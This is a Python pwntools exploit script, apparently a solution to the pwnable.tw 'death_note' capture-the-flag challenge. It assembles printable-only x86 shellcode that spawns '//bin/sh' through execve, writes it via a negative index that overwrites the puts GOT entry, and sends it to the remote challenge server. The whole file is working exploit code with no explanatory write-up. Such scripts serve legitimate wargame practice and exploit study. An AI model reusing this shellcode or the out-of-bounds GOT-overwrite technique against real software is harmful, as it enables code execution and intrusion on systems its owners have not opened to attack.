from pwn import *


def is_printable(s):
    for c in s:
        if c <= 0x1f or c >= 0x7f:
            print(f'Invalid character: {hex(c)}')
            return False
    return True


class Prompts:
    CHOICE = 'Your choice :'
    INDEX = 'Index :'
    NAME = 'Name :'


class Choice:
    ADD = '1'
    SHOW = '2'
    DELETE = '3'


PUTS_GOT_INDEX = str(-16)
death_note = ELF('death_note')

inc_eax = 'inc eax\n' * 0x0e  # Padding
shellcode = (
    'xor [edx+0x2a], al\n'
    'inc eax\n'
    'xor [edx+0x29], al\n'
    'push 0x2b\n'         # eax --> 0xb (SYS_EXECVE)
    'pop eax\n'
    'xor al, 0x20\n'
    'push ebx\n'          # 0x0
    'push 0x68732f6e\n'   # //bin/sh
    'push 0x69622f2f\n'
    'push ebx\n'
    'pop edx\n'           # edx --> 0x0
    'push esp\n'
    'pop ebx\n'           # ebx --> "//bin/sh"
    '.byte 0x32\n'
    '.byte 0x7e\n'
)
shellcode = inc_eax + shellcode

# p = gdb.debug( death_note.path,
#     '''
#     b * add_note+0xa0
#     c
#     '''
# )

p = remote('chall.pwnable.tw', 10201)

p.sendlineafter(Prompts.CHOICE, Choice.ADD)
p.sendlineafter(Prompts.INDEX, PUTS_GOT_INDEX)
p.sendlineafter(Prompts.NAME, asm(shellcode))
